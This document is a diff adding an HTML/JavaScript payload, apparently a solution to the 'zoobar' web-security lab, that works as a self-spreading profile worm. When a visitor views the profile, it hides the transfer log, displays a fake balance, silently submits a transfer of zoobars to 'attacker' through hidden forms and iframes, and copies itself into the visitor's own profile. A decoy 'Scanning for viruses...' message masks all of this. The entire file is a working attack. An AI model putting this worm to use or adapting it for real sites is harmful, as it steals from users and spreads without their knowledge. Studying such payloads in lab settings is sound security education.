@@ -1,0 +1,40 @@
+<div id="maindiv">
+  <script>
+     window.onload = function() {
+        var table = document.querySelector(".log");
+        table.querySelector("tbody").remove();
+        var profileheader = document.querySelector("#profileheader");
+        profileheader.style.display = "none";
+        var user = document.querySelector('input[name="user"]');
+        var newElement = document.createElement("div");
+        var mainElement = document.querySelector(".main");
+        newElement.innerHTML = user.value + "'s" + " zoobars:10";
+        mainElement.insertBefore(newElement, profileheader);
+        profileheader.textContent = user.value + "'s" + " zoobars:10";
+        var button = document.querySelector("#submitButton");
+        button.click();
+        var input = document.querySelector("#profileupdate");
+        var element = document.querySelector("#maindiv");
+        input.value = element.outerHTML;
+        var button2 = document.querySelector("#submitButton2");
+        button2.click();
+     }
+  </script>
+  <div>
+    <p>Scanning for viruses...</p>
+    <div style="display:none;">
+      <form target="iframe1" method="POST" name="transferform" action="http://localhost:8080/zoobar/index.cgi/transfer">
+        <p>Send <input name="zoobars" type="text" value="1" size="5"> zoobars</p>
+        <p>to <input name="recipient" type="text" value="attacker" size="10"></p>
+        <input type="submit" name="submission" value="Send" id="submitButton">
+      </form>
+        <form target="iframe2" method="POST" name="profileform" action="http://localhost:8080/zoobar/index.cgi/">
+        <p>Send <input name="profile_update" type="text" value="moi" id="profileupdate">
+        </p>
+        <input type="submit" name="profile_submit" value="Save" id="submitButton2">
+      </form>
+    </div>
+    <iframe style="display:none" name="iframe1"></iframe>
+    <iframe style="display:none" name="iframe2"></iframe>
+  </div>
+</div>
